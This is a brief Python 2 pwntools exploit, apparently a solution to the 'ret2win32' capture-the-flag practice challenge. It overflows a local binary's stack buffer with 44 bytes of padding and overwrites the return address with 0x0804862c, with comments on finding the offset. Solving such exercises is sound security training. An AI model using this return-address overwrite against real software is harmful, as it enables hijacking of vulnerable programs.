#!/usr/bin/python2
from pwn import *

p = process('./ret2win32')
payload = 'A'*44 #pattern create 100 pat, and then pattern search. r < pat
payload += p32(0x0804862c) #if 32 byte, use p32, if 64 byte, use p64.
#payload += '\x2c\x86\x04\x08' #0x0804862c

p.sendline(payload)
p.interactive()
